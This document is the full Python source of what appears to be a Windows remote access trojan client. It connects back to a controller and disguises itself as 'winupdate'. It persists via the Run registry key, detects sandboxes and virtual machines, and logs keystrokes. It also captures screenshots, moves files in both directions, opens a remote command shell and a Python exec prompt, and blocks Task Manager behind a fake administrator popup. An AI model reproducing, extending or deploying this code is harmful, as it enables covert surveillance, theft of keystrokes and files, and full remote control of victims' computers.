import socket, os, sys, platform, time, ctypes, subprocess, sqlite3, pyscreeze, threading, pynput.keyboard, wmi
import win32api, winerror, win32event, win32crypt
from shutil import copyfile
from winreg import *
from io import StringIO, BytesIO

strHost = "127.0.0.1"
# strHost = socket.gethostbyname("")
intPort = 3000

strPath = os.path.realpath(sys.argv[0])  # get file path
TMP = os.environ["TEMP"]  # get temp path
APPDATA = os.environ["APPDATA"]
intBuff = 1024

blnMeltFile = False
blnAddToStartup = False

# function to prevent multiple instances
mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    sys.exit(0)


# function to move file to tmp dir and relaunch
def meltFile():
    # ignore if the path is in appdata as well
    if not (os.getcwd() == TMP + "\\winupdate") and not (os.getcwd() == APPDATA):
        # if folder already exists
        try:
            os.mkdir(TMP + "\\winupdate")
        except:
            pass
        strNewFile = TMP + "\\winupdate\\" + os.path.basename(sys.argv[0])

        subprocess.Popen(
            "timeout 2 & move /y " + os.path.realpath(sys.argv[0]) + " " +  # move file to TMP and then relaunch
            strNewFile + " & cd  /d " + TMP + "\\winupdate\\" + " & " + strNewFile, shell=True)
        sys.exit(0)


def detectSandboxie():
    try:
        ctypes.windll.LoadLibrary("SbieDll.dll")
    except Exception:
        return False
    return True


def detectVM():
    objWMI = wmi.WMI()
    for objDiskDrive in objWMI.query("Select * from Win32_DiskDrive"):
        if "vbox" in objDiskDrive.Caption.lower() or "virtual" in objDiskDrive.Caption.lower():
            return True
    return False


def startup(onstartup):
    try:
        strAppPath = APPDATA + "\\" + os.path.basename(strPath)
        if not os.getcwd() == APPDATA:
            copyfile(strPath, strAppPath)

        objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
        SetValueEx(objRegKey, "winupdate", 0, REG_SZ, strAppPath)
        CloseKey(objRegKey)
    except WindowsError:
        if not onstartup:
            send(str.encode("Unable to add to startup! "))
    else:
        if not onstartup:
            send(str.encode("success"))


def remove_from_startup():
    try:
        objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
        DeleteValue(objRegKey, "winupdate")
        CloseKey(objRegKey)
    except FileNotFoundError:
        send(str.encode("Program is not registered in startup."))
    except WindowsError:
        send(str.encode("Error removing value!"))
    else:
        send(str.encode("success"))


def server_connect():
    global objSocket
    while True:  # infinite loop until socket can connect
        try:
            objSocket = socket.socket()
            objSocket.connect((strHost, intPort))
        except socket.error:
            time.sleep(5)  # wait 5 seconds to try again
        else: break

    strUserInfo = f"{socket.gethostname()}`,{platform.system()} {platform.release()}"
    if detectSandboxie():
        strUserInfo += " (Sandboxie) "
    if detectVM():
        strUserInfo += " (Virtual Machine) "
    strUserInfo += f"`,{os.environ['USERNAME']}"

    send(str.encode(strUserInfo))

# function to return decoded utf-8
decode_utf8 = lambda data: data.decode("utf-8", errors="replace")

# function to receive and decrypt data
recv = lambda buffer: objSocket.recv(buffer)

# function to send encrypted data
send = lambda data: objSocket.send(data)

if blnMeltFile: meltFile()
if blnAddToStartup: startup(True)

server_connect()

def OnKeyboardEvent(event):
    global strKeyLogs

    try:  # check to see if variable is defined
        strKeyLogs
    except NameError:
        strKeyLogs = ""

    if event == Key.backspace:
        strKeyLogs += " [Bck] "
    elif event == Key.tab:
        strKeyLogs += " [Tab] "
    elif event == Key.enter:
        strKeyLogs += "\n"
    elif event == Key.space:
        strKeyLogs += " "
    elif type(event) == Key:  # if the character is some other type of special key
        strKeyLogs += " [" + str(event)[4:] + "] "
    else:
        strKeyLogs += str(event)[1:len(str(event)) - 1]  # remove quotes around character


KeyListener = pynput.keyboard.Listener(on_press=OnKeyboardEvent)
Key = pynput.keyboard.Key


def recvall(buffer):  # function to receive large amounts of data
    bytData = b""
    while True:
        bytPart = recv(buffer)
        if len(bytPart) == buffer:
            return bytPart
        bytData += bytPart
        if len(bytData) == buffer:
            return bytData


# vbs message box
def MessageBox(message):
    objVBS = open(TMP + "/m.vbs", "w")
    objVBS.write("Msgbox \"" + message + "\", vbOKOnly+vbInformation+vbSystemModal, \"Message\"")
    objVBS.close()
    subprocess.Popen(["cscript", TMP + "/m.vbs"], shell=True)


def screenshot():
    # Take Screenshot
    objImage = pyscreeze.screenshot()
    # Create BytesIO Object as objBytes
    with BytesIO() as objBytes:
        # Save Screenshot into BytesIO Object
        objImage.save(objBytes, format='PNG')
        # Get BytesIO Object Data as bytes
        objPic = objBytes.getvalue()

    # send screenshot information to server
    send(str.encode("Receiving Screenshot\nFile size: {} bytes\nPlease wait...".format(str(len(objPic)))))
    time.sleep(1)
    # Send Image Data to Server
    send(objPic)


def file_browser():
    arrRawDrives = win32api.GetLogicalDriveStrings()  # get list of drives
    arrRawDrives = arrRawDrives.split('\000')[:-1]

    strDrives = ""
    for drive in arrRawDrives:  # get proper view and place array into string
        strDrives += drive.replace("\\", "") + "\n"
    send(str.encode(strDrives))

    strDir = decode_utf8(recv(intBuff))

    if os.path.isdir(strDir):
        if strDir[:-1] != "\\" or strDir[:-1] != "/":
            strDir += "\\"
        arrFiles = os.listdir(strDir)

        strFiles = ""
        for file in arrFiles:
            strFiles += (file + "\n")

        send(str.encode(str(len(strFiles))))  # send buffer size
        time.sleep(0.1)
        send(str.encode(strFiles))

    else:  # if the user entered an invalid directory
        send(str.encode("Invalid Directory!"))
        return


def upload(data):
    intBuffer = int(data)
    file_data = recvall(intBuffer)
    strOutputFile = decode_utf8(recv(intBuff))

    try:
        with open(strOutputFile, "wb") as objFile:
            objFile.write(file_data)
        send(str.encode("Done!!!"))
    except:
        send(str.encode("Path is protected/invalid!"))


def receive(data):
    if not os.path.isfile(data):
        send(str.encode("Target file not found!"))
        return

    send(str.encode(f"File size: {str(os.path.getsize(data))} bytes\nPlease wait..."))
    time.sleep(1)
    with open(data, 'rb') as objFile:
        send(objFile.read()) # Send Contents of File


def lock():
    ctypes.windll.user32.LockWorkStation()  # lock pc


def shutdown(shutdowntype):
    command = "shutdown {0} -f -t 30".format(shutdowntype)
    subprocess.Popen(command.split(), shell=True)
    objSocket.close()  # close connection and exit
    sys.exit(0)


def command_shell():
    strCurrentDir = os.getcwd()
    send(os.getcwdb())

    while True:
        strData = decode_utf8(recv(intBuff))

        if strData == "goback":
            os.chdir(strCurrentDir)  # change directory back to original
            break

        elif strData[:2].lower() == "cd" or strData[:5].lower() == "chdir":
            objCommand = subprocess.Popen(strData + " & cd", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            if (objCommand.stderr.read()).decode("utf-8") == "":  # if there is no error
                strOutput = (objCommand.stdout.read()).decode("utf-8").splitlines()[0]  # decode and remove new line
                os.chdir(strOutput)  # change directory

                bytData = str.encode("\n" + str(os.getcwd()) + ">")  # output to send the server

        elif len(strData) > 0:
            objCommand = subprocess.Popen(strData, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            strOutput = (objCommand.stdout.read() + objCommand.stderr.read()).decode("utf-8", errors="replace")  # since cmd uses bytes, decode it

            bytData = str.encode(f"{strOutput}\n{os.getcwd()}>")
        else:
            bytData = str.encode("Error!!!")

        strBuffer = str(len(bytData))
        send(str.encode(strBuffer))  # send buffer size
        time.sleep(0.1)
        send(bytData)  # send output

def python_interpreter():
    send(str.encode("received"))
    while True:
        strCommand = recv(intBuff).decode("utf-8")
        if strCommand == "exit":
            send(str.encode("exiting"))
            break
        old_stdout = sys.stdout
        redirected_output = sys.stdout = StringIO()
        try:
            exec(strCommand)
            print()
            strError = None
        except Exception as e:
            strError = f"{e.__class__.__name__}: "
            try:
                strError += f"{e.args[0]}"
            except:
                pass
        finally:
            sys.stdout = old_stdout
        if strError:
            send(strError.encode())
        else:
            send(redirected_output.getvalue().encode())

def vbs_block_process(process, popup, message, title, timeout, type):
    # VBScript to block process, this allows the script to disconnect from the original python process, check github rep for source

    strVBSCode = "On Error Resume Next" + "\n" + \
                 "Set objWshShl = WScript.CreateObject(\"WScript.Shell\")" + "\n" + \
                 "Set objWMIService = GetObject(\"winmgmts:\" & \"{impersonationLevel=impersonate}!//./root/cimv2\")" + "\n" + \
                 "Set colMonitoredProcesses = objWMIService.ExecNotificationQuery(\"select * " \
                 "from __instancecreationevent \" & \" within 1 where TargetInstance isa 'Win32_Process'\")" + "\n" + \
                 "Do" + "\n" + "Set objLatestProcess = colMonitoredProcesses.NextEvent" + "\n" + \
                 "If LCase(objLatestProcess.TargetInstance.Name) = \"" + process + "\" Then" + "\n" + \
                 "objLatestProcess.TargetInstance.Terminate" + "\n"
    if popup == "True":  # if showing a message
        strVBSCode += "objWshShl.Popup \"" + message + "\"," + timeout + ", \"" + title + "\"," + type + "\n"

    strVBSCode += "End If" + "\n" + "Loop"

    objVBSFile = open(TMP + "/d.vbs", "w")  # write the code and close the file
    objVBSFile.write(strVBSCode); objVBSFile.close()

    subprocess.Popen(["cscript", TMP + "/d.vbs"], shell=True)  # run the script


def disable_taskmgr():
    global blnDisabled
    if blnDisabled == "False":  # if task manager is already disabled, enable it
        send(str.encode("Enabling ..."))

        subprocess.Popen(["taskkill", "/f", "/im", "cscript.exe"], shell=True)

        blnDisabled = "True"
    else:
        send(str.encode("Disabling ..."))

        vbs_block_process("taskmgr.exe", "True", "Task Manager has been disabled by your administrator",
                      "Task Manager", "3", "16")
        blnDisabled = "False"


def keylogger(option):
    global strKeyLogs

    if option == "start":
        if not KeyListener.running:
            KeyListener.start()
            send(str.encode("success"))
        else:
            send(str.encode("error"))

    elif option == "stop":
        if KeyListener.running:
            KeyListener.stop()
            threading.Thread.__init__(KeyListener)  # re-initialise the thread
            strKeyLogs = ""
            send(str.encode("success"))
        else:
            send(str.encode("error"))

    elif option == "dump":
        if not KeyListener.running:
            send(str.encode("error"))
        else:
            if strKeyLogs == "":
                send(str.encode("error2"))
            else:
                time.sleep(0.2)
                send(str.encode(str(len(strKeyLogs))))  # send buffer size
                time.sleep(0.2)
                send(str.encode(strKeyLogs))  # send logs

                strKeyLogs = ""  # clear logs


def run_command(command):
    strLogOutput = "\n"

    if len(command) > 0:
        objCommand = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
        strLogOutput += (objCommand.stdout.read() + objCommand.stderr.read()).decode("utf-8", errors="ignore")
    else:
        strLogOutput += "Error!!!"

    bytData = str.encode(strLogOutput)

    strBuffer = str(len(bytData))
    send(str.encode(strBuffer))  # send buffer size
    time.sleep(0.1)
    send(bytData)  # send output


while True:
    try:
        while True:
            strData = recv(intBuff)
            strData = decode_utf8(strData)

            if strData == "exit":
                objSocket.close()
                sys.exit(0)
            elif strData[:3] == "msg":
                MessageBox(strData[3:])
            elif strData == "startup":
                startup(False)
            elif strData == "rmvstartup":
                remove_from_startup()
            elif strData == "screen":
                screenshot()
            elif strData == "filebrowser":
                file_browser()
            elif strData[:4] == "send":
                upload(strData[4:])
            elif strData[:4] == "recv":
                receive(strData[4:])
            elif strData == "lock":
                lock()
            elif strData == "shutdown":
                shutdown("-s")
            elif strData == "restart":
                shutdown("-r")
            elif strData == "test":
                continue
            elif strData == "cmd":
                command_shell()
            elif strData == "python":
                python_interpreter()
            elif strData == "keystart":
                keylogger("start")
            elif strData == "keystop":
                keylogger("stop")
            elif strData == "keydump":
                keylogger("dump")
            elif strData[:6] == "runcmd":
                run_command(strData[6:])
            elif strData == "dtaskmgr":
                if not "blnDisabled" in globals():  # if the variable doesnt exist yet
                    blnDisabled = "True"
                disable_taskmgr()
    except socket.error:  # if the server closes without warning
        objSocket.close()
        del objSocket
        server_connect()

# eof
